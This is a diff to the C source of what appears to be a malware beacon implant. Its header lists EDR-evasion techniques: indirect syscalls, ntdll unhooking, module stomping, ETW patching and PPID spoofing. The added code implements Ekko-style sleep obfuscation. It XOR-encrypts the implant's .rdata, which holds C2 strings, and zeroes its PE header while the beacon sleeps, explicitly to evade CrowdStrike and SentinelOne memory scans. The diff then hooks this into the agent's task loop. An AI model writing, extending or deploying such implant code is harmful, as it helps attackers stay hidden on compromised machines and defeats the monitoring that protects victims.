@@ -6,7 +6,7 @@
  *   - Indirect syscalls    : syscall;ret gadget from ntdll defeats stack-walking EDRs
  *   - ntdll unhooking      : restores clean .text from disk before injection
  *   - Module stomping      : shellcode in signed DLL .text (already-RX, backed region)
- *   - XOR sleep masking    : entropic key from tick+pid+tid, payload encrypted during jitter
+ *   - Sleep obfuscation    : Ekko-style .rdata XOR encrypt + PE header zero during beacon sleep
  *   - W^X stubs            : RX stubs pre-baked, zero RWX memory
  *   - ETW patch            : EtwEventWrite → RET via indirect syscall
  *   - PPID spoof           : WerFault parented to explorer.exe
@@ -431,6 +431,100 @@ static NTSTATUS POLY_NTWNFUPD(PVOID sn,PVOID buf,ULONG len,PVOID ti,PVOID es,ULO
 /* T13: free private shellcode allocation post-execution */
 static NTSTATUS POLY_NTFREE(HANDLE h,PVOID*b,PSIZE_T s,ULONG t){
     return ((pNtFreeVirtualMemory)LT_STUB(LT_SI_FREE))(h,b,s,t);}
+
+/* forward declaration — defined later after lt_strlen/lt_zero helpers */
+static DWORD lt_jitter_ms(DWORD base_ms);
+
+/*
+ * Ekko-style sleep obfuscation: during beacon idle sleep, encrypt .rdata (C2 strings,
+ * constants) with a per-sleep XOR key and zero the PE header. Restores everything on wake.
+ * Defeats CrowdStrike / SentinelOne memory scanners that scan for PE signatures during sleep.
+ * POLY_STUBS (indirect syscall trampoline) lives in separately VirtualAlloc'd memory — safe.
+ * Only .rdata is touched (READ, no EXEC, no WRITE); .text and .data are never modified.
+ * Falls back to plain POLY_NTDELAY if PE parsing fails.
+ */
+static void POLY_CRYPT_SLEEP(DWORD base_ms) {
+    LONGLONG sleep_100ns = (LONGLONG)lt_jitter_ms(base_ms) * 10000LL;
+
+    /* Locate own PE base via VirtualQuery on a known .text address */
+    MEMORY_BASIC_INFORMATION mbi;
+    if(!VirtualQuery((PVOID)POLY_CRYPT_SLEEP, &mbi, sizeof(mbi))) goto cs_plain;
+    PBYTE img = (PBYTE)mbi.AllocationBase;
+    if(*(WORD*)img != 0x5A4D) goto cs_plain;
+
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(img + ((PIMAGE_DOS_HEADER)img)->e_lfanew);
+    if(nt->Signature != IMAGE_NT_SIGNATURE) goto cs_plain;
+
+    WORD nsec = nt->FileHeader.NumberOfSections;
+    if(nsec > 32) nsec = 32;
+
+    /* Cache section metadata before zeroing the PE header */
+    struct { DWORD va, vsz, ch; ULONG orig_prot; int enc; } sc[32];
+    PIMAGE_SECTION_HEADER sec0 = IMAGE_FIRST_SECTION(nt);
+    for(WORD _i=0;_i<nsec;_i++){
+        sc[_i].va=sec0[_i].VirtualAddress; sc[_i].vsz=sec0[_i].Misc.VirtualSize;
+        sc[_i].ch=sec0[_i].Characteristics; sc[_i].orig_prot=0; sc[_i].enc=0;
+    }
+
+    /* XOR key: 32 bytes, derived from tick^pid per sleep — different every beacon cycle */
+    BYTE _cs_key[32];
+    DWORD _cs_tick=GetTickCount(); DWORD _cs_pid=GetCurrentProcessId();
+    for(int _ki=0;_ki<32;_ki++)
+        _cs_key[_ki]=(BYTE)((((_cs_tick>>(_ki%4*8))^(_cs_pid%(256<<(_ki%3*8))))^(BYTE)_ki));
+
+    /* Backup and zero PE header */
+    DWORD hdr_sz = nt->OptionalHeader.SizeOfHeaders;
+    if(!hdr_sz || hdr_sz>0x1000) hdr_sz=0x1000;
+    BYTE _cs_hdr[0x1000];
+    for(DWORD _hi=0;_hi<hdr_sz;_hi++) _cs_hdr[_hi]=img[_hi];
+
+    PVOID hp=(PVOID)img; SIZE_T hs=(SIZE_T)hdr_sz; ULONG hdr_old=0;
+    int hdr_ok=NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&hp,&hs,PAGE_READWRITE,&hdr_old));
+    if(hdr_ok){
+        for(DWORD _hi=0;_hi<hdr_sz;_hi++) img[_hi]=0;
+        POLY_NTPROT(GetCurrentProcess(),&hp,&hs,PAGE_NOACCESS,&hdr_old);
+    }
+
+    /* Encrypt .rdata sections: READ set, EXECUTE clear, WRITE clear */
+    for(WORD _si=0;_si<nsec;_si++){
+        DWORD ch=sc[_si].ch;
+        if(!(ch&IMAGE_SCN_MEM_READ)||(ch&IMAGE_SCN_MEM_EXECUTE)||(ch&IMAGE_SCN_MEM_WRITE)) continue;
+        PBYTE sb=img+sc[_si].va; SIZE_T ssz=(SIZE_T)sc[_si].vsz;
+        if(!ssz) continue;
+        PVOID spb=(PVOID)sb; SIZE_T spsz=ssz; ULONG sold=0;
+        if(!NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&spb,&spsz,PAGE_READWRITE,&sold))) continue;
+        sc[_si].orig_prot=sold; sc[_si].enc=1;
+        for(SIZE_T _bi=0;_bi<ssz;_bi++) sb[_bi]^=_cs_key[_bi%32];
+        POLY_NTPROT(GetCurrentProcess(),&spb,&spsz,PAGE_NOACCESS,&sold);
+    }
+
+    /* Sleep — call through stub directly; .text is intact, stubs in VirtualAlloc'd mem */
+    { LARGE_INTEGER _li; _li.QuadPart=-sleep_100ns;
+      ((pNtDelayExecution)LT_STUB(LT_SI_DELAY))(FALSE,&_li); }
+
+    /* Decrypt .rdata sections */
+    for(WORD _si=0;_si<nsec;_si++){
+        if(!sc[_si].enc) continue;
+        PBYTE sb=img+sc[_si].va; SIZE_T ssz=(SIZE_T)sc[_si].vsz;
+        PVOID spb=(PVOID)sb; SIZE_T spsz=ssz; ULONG dummy=0;
+        if(!NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&spb,&spsz,PAGE_READWRITE,&dummy))) continue;
+        for(SIZE_T _bi=0;_bi<ssz;_bi++) sb[_bi]^=_cs_key[_bi%32];
+        POLY_NTPROT(GetCurrentProcess(),&spb,&spsz,sc[_si].orig_prot,&dummy);
+    }
+
+    /* Restore PE header */
+    if(hdr_ok){
+        PVOID rhp=(PVOID)img; SIZE_T rhs=(SIZE_T)hdr_sz; ULONG rho=0;
+        if(NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&rhp,&rhs,PAGE_READWRITE,&rho))){
+            for(DWORD _hi=0;_hi<hdr_sz;_hi++) img[_hi]=_cs_hdr[_hi];
+            POLY_NTPROT(GetCurrentProcess(),&rhp,&rhs,hdr_old,&rho);
+        }
+    }
+    return;
+
+cs_plain:
+    POLY_NTDELAY(sleep_100ns);
+}
 
 /*
  * Task 8 — ETW patch: stub out user-mode ETW dispatch functions with RET.
@@ -3209,7 +3303,7 @@ static void POLY_AGENT(void) {
         if(_any_active)
             POLY_NTDELAY(500LL*10000LL);
         else
-            POLY_NTDELAY((LONGLONG)lt_jitter_ms(_lt_sleep_base_ms)*10000LL);
+            POLY_CRYPT_SLEEP(_lt_sleep_base_ms);
 
         /* ── Harvest completed slots and POST results ── */
         for(int _si=0;_si<LT_MAX_CONCURRENT;_si++){
